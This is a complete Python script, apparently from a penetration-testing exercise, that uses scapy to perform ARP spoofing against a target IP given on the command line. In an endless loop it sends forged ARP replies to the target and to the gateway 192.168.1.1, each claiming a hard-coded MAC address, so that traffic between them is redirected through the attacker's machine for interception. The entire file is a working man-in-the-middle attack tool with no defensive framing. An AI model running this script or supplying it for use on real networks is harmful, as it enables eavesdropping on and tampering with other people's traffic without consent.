#!/bin/python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa......", 'red'))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument('-t', '--target', dest="ip_address", required=True, help="HOST / IP Range to spoof" )

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="08:00:27:df:22:b2")
    scapy.send(arp_packet, verbose=False)


def main():
    arguments = get_arguments()

    while True:
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.1.1", arguments.ip_address)

        time.sleep(2)

if __name__ == '__main__':
    main()
